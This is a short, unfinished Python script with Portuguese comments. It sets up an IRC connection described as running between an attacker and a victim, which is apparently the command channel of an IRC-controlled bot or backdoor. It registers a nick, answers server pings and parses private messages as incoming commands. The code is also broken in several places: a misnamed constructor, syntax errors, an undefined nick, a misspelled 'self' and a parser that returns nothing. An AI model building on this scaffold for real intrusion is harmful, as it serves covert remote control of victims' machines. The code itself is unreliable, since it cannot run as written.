#!/usr/bin/python3

import socket
import re

#conexao IRC entre o atacante e a vitima
class ConexaoAtacante:
	def __int__(self, enderecoIRC):
		self.socket = socket.socket()
		self.socket.connect(enderecoIRC):
		self.registra_usuario(nick)
		self.nick = nick
	
	def envia_comando(self, cmd):
		cmd += '\r\n'
		self.socket.send(cmd.encode('utf8'))
	
	def parse_msg(self, msg)
		match = re.match(':(.*)!.*@.*(?:\..*)* PRIVMSG {} :(.*)\r\n'.format(self.nick), msg)
		
	def recebe_comando(self):
		msg = self.socket.recv()
		msg = msg.decode('utf8', error='ignore')
		self.responde_ping(msg)
		msg_match = selgf.parse_msg(msg)
		if msg_match:
			return msg_match.groups()
		return None, None
		
	def registra_usuario(self, nick):
		self.envia_comando('NICK ' + nick)
		self.envia_comando('USER {0} {0} {0} :{0}'.format(nick))
		
	def responde_ping(self, msg):
		match = re.match('PING: (.*)', msg)
		if match:
			pong = match.group(1)
			self.envia_comando('PONG:' + pong)
			
conexao = ConexaoAtacante(('endereco', porta))




